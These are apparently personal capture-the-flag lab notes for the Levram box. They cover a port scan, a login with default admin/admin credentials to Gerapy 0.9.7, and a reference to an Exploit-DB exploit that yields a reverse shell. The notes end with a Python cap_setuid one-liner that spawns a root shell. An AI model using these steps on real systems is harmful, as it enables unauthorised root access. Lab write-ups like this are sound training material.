---
tags: [ProvingGround]
---

Levram 5/27/25

-------------------------------

## 1. sudo nmap -p- -sC -sV -Pn -n --open 192.168.189.24 -oN nmap/initial
Nmap scan report for 192.168.189.24
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## 2. Went to 192.168.189.24:8000. Logged in with admin/admin
## 3. Determined version Gerapy 0.9.7 running.
## 4. Searched in Exploit DB found https://www.exploit-db.com/exploits/50640
## 5. Ran exploit and received reverse shell as user app.
## 6. With access as root ran getcap -r / 2>/dev/null
## 7. python3.10 cap_setuid=ep
## 8. Looked up in GTFOBins
## 9. /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'